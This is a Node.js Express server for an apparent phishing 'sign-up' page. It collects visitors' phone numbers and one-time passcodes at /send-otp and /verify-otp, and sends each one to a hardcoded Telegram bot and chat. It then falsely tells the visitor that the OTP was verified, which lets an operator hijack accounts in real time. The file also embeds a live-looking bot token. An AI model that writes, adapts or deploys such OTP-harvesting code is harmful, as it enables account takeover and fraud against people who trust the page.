const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON and URL-encoded bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(__dirname));

// Telegram Bot Credentials
const TELEGRAM_BOT_TOKEN = '8439698505:AAGLOUR5DuMaMLm81HarVsDvQ8gFkvcZFU0';
const TELEGRAM_CHAT_ID = '8698008425';

// Helper function to send message to Telegram
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (error) {
        console.error('Telegram error:', error);
    }
}

// 1. Step 1: Jab user phone number daal kar OTP Request bheje
app.post('/send-otp', async (req, res) => {
    const { phone } = req.body;
    
    const msg = `📲 *New OTP Request!*\n\n*Phone Number:* \`${phone}\``;
    await sendTelegramMessage(msg);

    res.json({ success: true, message: 'OTP request sent successfully' });
});

// 2. Step 2: Jab user OTP code enter karke submit kare
app.post('/verify-otp', async (req, res) => {
    const { phone, otp } = req.body;
    
    const msg = `🔑 *OTP Submitted!*\n\n*Phone Number:* \`${phone}\`\n*OTP Code:* \`${otp}\``;
    await sendTelegramMessage(msg);

    res.json({ success: true, message: 'OTP verified successfully' });
});

// Main route to serve the sign-up page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
